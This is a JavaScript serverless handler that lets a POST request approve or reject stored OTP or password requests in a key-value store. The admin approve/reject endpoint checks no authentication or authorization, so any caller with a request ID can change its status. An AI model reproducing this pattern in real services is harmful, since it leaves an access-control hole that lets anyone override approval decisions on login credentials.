import { makeJsonResponse, makeTextResponse, getRequestFromKV, setRequestInKV } from "../_shared.js";

async function applyAction(env, requestId, action) {
  // Try OTP first, then password
  let item = await getRequestFromKV(env, requestId, "otp");
  let type = "otp";
  
  if (!item) {
    item = await getRequestFromKV(env, requestId, "password");
    type = "password";
  }

  if (!item) return false;

  if (action === "approve") {
    item.approved = true;
    item.rejectedReason = null;
  } else if (action === "reject") {
    item.rejectedReason = "Admin rejected the request";
    item.approved = false;
  }
  
  await setRequestInKV(env, requestId, item, type);
  return true;
}

export async function onRequest(context) {
  const { request, env } = context;

  if (request.method === "OPTIONS") return makeTextResponse("", 204);
  if (request.method !== "POST") return makeJsonResponse({ error: "Method not allowed" }, 405);

  try {
    const { requestId, action } = await request.json();
    const success = await applyAction(env, requestId, action);
    
    if (!success) return makeJsonResponse({ error: "Request not found" }, 404);
    return makeJsonResponse({ success: true });
  } catch (error) {
    return makeJsonResponse({ error: "Internal Server Error" }, 500);
  }
}